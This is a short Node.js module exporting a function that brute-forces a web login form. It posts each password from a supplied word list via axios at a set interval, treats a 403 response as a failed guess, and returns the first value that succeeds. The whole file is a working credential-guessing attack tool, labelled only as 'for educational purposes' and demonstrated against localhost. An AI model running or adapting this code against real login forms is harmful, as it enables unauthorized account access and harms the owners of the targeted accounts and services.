const axios = require('axios');

/**
 * This function Brute-forces a web form based on the data given.
 * It was made and should be used purely for educational purposes.
 *
 * @requires module:axios
 *
 * @param {Object} config - Should contain "url", "data" and the bruteforced input field should be null
 * @param {Array} wordList - This should be an array with all possibilities to try
 * @param {Number} interval - This is the number of miliseconds between each try
 * @returns {Promise}
 *
 * @example
 *      const config = { url: "htttp://localhost:5000", data: { name: "John Doe", password: null }}
 *      const wordList = ["123456","1111111", "01234qwe"]
 *
 *      formBrute(config, wordList, 5)
 *          .then((res) => {
 *              // Working with the response
 *          })
 *          .catch((err) => {
 *              // Handling errors
 *          })
 */
module.exports.formBrute = (config, wordList, interval) => {
	return new Promise((resolve, reject) => {
		let iter = 0;

		const aux = Object.keys(config.data).find(
			(key) => config.data[key] === null
		);

		const timer = setInterval(() => {
			config.data[aux] = wordList[iter];
			axios({
				method: 'post',
				...config,
			})
				.then((response) => {
					console.log(
						`--> POST request to http://localhost:5000 lname = ${wordList[iter]} --> status: ${response.status}`
					);
					clearInterval(timer);
					resolve(wordList[iter]);
				})
				.catch((err) => {
					if (err.code !== 'ECONNREFUSED' && err.response.status === 403) {
						console.log(
							`--> POST request to http://localhost:5000 lname = ${wordList[iter]} --> status: ${err.response.status}`
						);
						iter++;
					} else {
						clearInterval(timer);
						reject(err);
					}
				});

			if (iter === wordList.length) reject(null);
		}, interval);
	});
};
